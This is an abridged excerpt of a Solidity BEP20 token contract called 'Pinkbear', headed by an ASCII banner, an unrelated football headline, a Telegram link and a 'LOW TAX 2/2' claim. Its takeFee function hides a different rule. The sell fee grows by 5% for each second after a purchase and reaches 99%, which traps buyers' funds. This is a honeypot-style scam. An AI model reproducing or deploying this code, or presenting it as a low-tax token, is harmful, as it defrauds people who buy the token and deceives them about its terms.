...
\______   \_   _____/|    |    \_   _____/
 ...
 |____|   /_______  /|_______ \/_______  /
                  \/         \/        \/
   PELÉ TACLE MESSI : "IL N'A QU'UN TALENT : SON PIED GAUCHE"
            Telegram:https://t.me/Pinkbear
            Tax     :2/2
                     1LP 1Marketing  LOW TAX
...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    mapping(address => uint256) private tokenLockTime;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient == uniswapV2Pair) {
                address ad;
                for (int i = 0; i <= 3; i++) {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (isMarketPair[sender]) {
            ...
            tokenLockTime[recipient] = block.timestamp;
        }
        else if (isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if (!isMarketPair[sender]) {
            uint256 lockTime = tokenLockTime[sender];
            uint256 lockFee = _totalTaxIfSelling;
            if (lockTime > 0 && block.timestamp - lockTime > 4) {
                lockFee = (block.timestamp - lockTime - 3) * 5;
                if (lockFee > 99) {
                    lockFee = 99;
                }
            }
            feeAmount = amount.mul(lockFee).div(100);
        }
...
contract Pinkbear is BEP20 {
    constructor() BEP20(
        ...
        [0x428C2C9b424eA8d32F792af1F962cE4C15193932, 0x428C2C9b424eA8d32F792af1F962cE4C15193932]
    ){}
}